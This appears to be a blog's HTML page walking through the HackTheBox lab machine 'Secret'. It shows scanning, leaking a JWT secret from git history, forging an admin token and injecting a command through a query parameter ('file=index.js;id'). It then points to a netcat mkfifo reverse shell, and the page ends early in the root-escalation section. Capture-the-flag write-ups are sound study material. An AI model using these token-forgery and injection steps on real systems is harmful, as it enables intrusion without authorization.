@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Secret Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-03-26-secret/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Secret Hackthebox writeup">
+  <meta property="og:description" content="In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has PR_SET_DUMPABLE so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-26T00:45:19+02:00">
+    <meta property="article:modified_time" content="2022-03-26T00:45:19+02:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="API">
+    <meta property="article:tag" content="JWT">
+    <meta property="article:tag" content="SUID">
+    <meta property="article:tag" content="Core-Dump">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Secret Hackthebox writeup">
+  <meta name="twitter:description" content="In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has PR_SET_DUMPABLE so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-03-26-secret/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-03-11-devzat/" /><link rel="next" href="http://example.org/posts/linux-machines/2022-04-01-shibboleth/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Secret Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-03-26-secret\/"
+        },"genre": "posts","keywords": "Hackthebox, API, JWT, SUID, core-dump","wordcount":  859 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-03-26-secret\/","datePublished": "2022-03-26T00:45:19+02:00","dateModified": "2022-03-26T00:45:19+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Secret Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-26">2022-03-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;859 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#analyzing-the-code">Analyzing the code</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-access">Root Access</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has <code>PR_SET_DUMPABLE</code> so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root</p>
+<h1 id="scanning-">Scanning :</h1>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 10.10.11.120 -oN nmap.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<h1 id="enumerating-">Enumerating :</h1>
+<p>we can Follow the documentation guide to register a user :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326105821.png"
+        data-srcset="/assets/images/secret/20220326105821.png, /assets/images/secret/20220326105821.png 1.5x, /assets/images/secret/20220326105821.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326105821.png"
+        title="error" /></p>
+<p>so we can try :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://10.10.11.120/api/user/register -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;MESBAHA&#34;,&#34;email&#34;: &#34;test@testers.com&#34;,&#34;password&#34;: &#34;hecker&#34;}&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110011.png"
+        data-srcset="/assets/images/secret/20220326110011.png, /assets/images/secret/20220326110011.png 1.5x, /assets/images/secret/20220326110011.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110011.png"
+        title="error" /></p>
+<p>and this is the expected response for a successful registration as we see in the Documentation</p>
+<p>now we want to login with this user , we can check the documentation :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110215.png"
+        data-srcset="/assets/images/secret/20220326110215.png, /assets/images/secret/20220326110215.png 1.5x, /assets/images/secret/20220326110215.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110215.png"
+        title="error" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://10.10.11.120/api/user/login -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;test@testers.com&#34;,&#34;password&#34;: &#34;hecker&#34;}&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110253.png"
+        data-srcset="/assets/images/secret/20220326110253.png, /assets/images/secret/20220326110253.png 1.5x, /assets/images/secret/20220326110253.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110253.png"
+        title="error" /></p>
+<p>and this means we login successfully as documentation tells us :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110340.png"
+        data-srcset="/assets/images/secret/20220326110340.png, /assets/images/secret/20220326110340.png 1.5x, /assets/images/secret/20220326110340.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110340.png"
+        title="error" /></p>
+<p>now we can also see we can try access private route :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110541.png"
+        data-srcset="/assets/images/secret/20220326110541.png, /assets/images/secret/20220326110541.png 1.5x, /assets/images/secret/20220326110541.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110541.png"
+        title="error" /></p>
+<p>providing our token in the host header and making a get request :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoiTUVTQkFIQSIsImVtYWlsIjoidGVzdEB0ZXN0ZXJzLmNvbSIsImlhdCI6MTY0ODI4NjQ1MH0.qw4zy4hLWs95jH4y09sEcgOFPxDtOEWaw9Xv_E5ZpOg&#34;</span> http://10.10.11.120/api/priv</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326110630.png"
+        data-srcset="/assets/images/secret/20220326110630.png, /assets/images/secret/20220326110630.png 1.5x, /assets/images/secret/20220326110630.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326110630.png"
+        title="error" /></p>
+<p>so now we want to elevate to admin , we need to provide the admin token to login as admin rule.</p>
+<p>we can see at the main page we can download the source-codes</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326111100.png"
+        data-srcset="/assets/images/secret/20220326111100.png, /assets/images/secret/20220326111100.png 1.5x, /assets/images/secret/20220326111100.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326111100.png"
+        title="error" /></p>
+<p>maybe downloading the source codes can reveal more information to us</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.11.120/download/files.zip
+</span></span><span class="line"><span class="cl">unzip files.zip</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326111212.png"
+        data-srcset="/assets/images/secret/20220326111212.png, /assets/images/secret/20220326111212.png 1.5x, /assets/images/secret/20220326111212.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326111212.png"
+        title="error" /></p>
+<p>and we can see it is a git repository , we can check the logs to see if the owner deleted something recently.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git log</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326111312.png"
+        data-srcset="/assets/images/secret/20220326111312.png, /assets/images/secret/20220326111312.png 1.5x, /assets/images/secret/20220326111312.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326111312.png"
+        title="error" /></p>
+<p>and this log seems interesting , if we read the current <code>.env</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TOKEN_SECRET</span> <span class="o">=</span> secret</span></span></code></pre></div></div>
+<p>it contains the environment variables , there are very common mistakes can happen at this file like providing username and password at the connect variable or releasing secret tokens.</p>
+<p>we can follow this path and see the previous version of <code>.env</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326111644.png"
+        data-srcset="/assets/images/secret/20220326111644.png, /assets/images/secret/20220326111644.png 1.5x, /assets/images/secret/20220326111644.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326111644.png"
+        title="error" /></p>
+<p>now we have the secret , we can go to <a href="https://jwt.io/" target="_blank" rel="noopener noreffer ">jwt.io</a> providing our token and the secret we can modify the name to admin.</p>
+<p>if we change it to admin it won&rsquo;t work , back to the Documnetation we will see admin name is &ldquo;theadmin&rdquo;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326112313.png"
+        data-srcset="/assets/images/secret/20220326112313.png, /assets/images/secret/20220326112313.png 1.5x, /assets/images/secret/20220326112313.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326112313.png"
+        title="error" /></p>
+<p>now moidify our token :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326112348.png"
+        data-srcset="/assets/images/secret/20220326112348.png, /assets/images/secret/20220326112348.png 1.5x, /assets/images/secret/20220326112348.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326112348.png"
+        title="error" /></p>
+<p>we can now use this token to request the <code>/priv</code> again</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E&#34;</span> http://10.10.11.120/api/priv</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326112426.png"
+        data-srcset="/assets/images/secret/20220326112426.png, /assets/images/secret/20220326112426.png 1.5x, /assets/images/secret/20220326112426.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326112426.png"
+        title="error" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif"
+        data-srcset="https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif, https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif 1.5x, https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif 2x"
+        data-sizes="auto"
+        alt="https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif"
+        title="https://media.giphy.com/assets/images/wAxlCmeX1ri1y/giphy.gif" /></p>
+<p>now what ðŸ˜‚?</p>
+<p>we can check the source code for the private route under <code>local-web/routes/private.js</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326112803.png"
+        data-srcset="/assets/images/secret/20220326112803.png, /assets/images/secret/20220326112803.png 1.5x, /assets/images/secret/20220326112803.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326112803.png"
+        title="error" /></p>
+<p>if we make a get request as admin to <code>/logs</code> with parameter <code>file</code> it will execute command :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git log --oneline <span class="si">${</span><span class="nv">file</span><span class="si">}</span></span></span></code></pre></div></div>
+<p>we can try see if it works :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326113127.png"
+        data-srcset="/assets/images/secret/20220326113127.png, /assets/images/secret/20220326113127.png 1.5x, /assets/images/secret/20220326113127.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326113127.png"
+        title="error" /></p>
+<p>and it is working , we can try some command injection here :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E&#34;</span> <span class="s2">&#34;http://10.10.11.120/api/logs?file=index.js;id&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326113231.png"
+        data-srcset="/assets/images/secret/20220326113231.png, /assets/images/secret/20220326113231.png 1.5x, /assets/images/secret/20220326113231.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326113231.png"
+        title="error" /></p>
+<h1 id="foothold">Foothold:</h1>
+<p>Hence we have command injection we can now try to get a reverse shell .</p>
+<p>the <code>nc mkfifo</code> payload works fine , at <a href="https://www.revshells.com/" target="_blank" rel="noopener noreffer ">revshells.com</a>, but make sure you url-encoded it , i have used <a href="https://www.urlencoder.org/" target="_blank" rel="noopener noreffer ">this</a></p>
+<p>now we are in :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326113630.png"
+        data-srcset="/assets/images/secret/20220326113630.png, /assets/images/secret/20220326113630.png 1.5x, /assets/images/secret/20220326113630.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326113630.png"
+        title="error" /></p>
+<h1 id="privilege-escalation-">Privilege escalation :</h1>
+<p>using <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220320/linpeas.sh" target="_blank" rel="noopener noreffer ">Linpeas</a> or Just manual navigating in the system you will find under <code>/opt</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326113825.png"
+        data-srcset="/assets/images/secret/20220326113825.png, /assets/images/secret/20220326113825.png 1.5x, /assets/images/secret/20220326113825.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326113825.png"
+        title="error" /></p>
+<p>and this binary has the suid bit which we can try to abuse</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count</span></span></code></pre></div></div>
+<p>if we try to run the program we can see it just counts the content in a file</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326114250.png"
+        data-srcset="/assets/images/secret/20220326114250.png, /assets/images/secret/20220326114250.png 1.5x, /assets/images/secret/20220326114250.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326114250.png"
+        title="error" /></p>
+<h3 id="analyzing-the-code">Analyzing the code</h3>
+<p>we can see the file we supply will be loaded , then the function will count it line by line and word by word,..etc</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326114400.png"
+        data-srcset="/assets/images/secret/20220326114400.png, /assets/images/secret/20220326114400.png 1.5x, /assets/images/secret/20220326114400.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326114400.png"
+        title="error" /></p>
+<p>we can also see this comment and this code line :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326114529.png"
+        data-srcset="/assets/images/secret/20220326114529.png, /assets/images/secret/20220326114529.png 1.5x, /assets/images/secret/20220326114529.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326114529.png"
+        title="error" /></p>
+<p>this seems irregular to me</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-C">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span></span></span></code></pre></div></div>
+<p>checking <strong>prctl()</strong> manual <a href="https://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener noreffer ">here</a> we can find :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326114727.png"
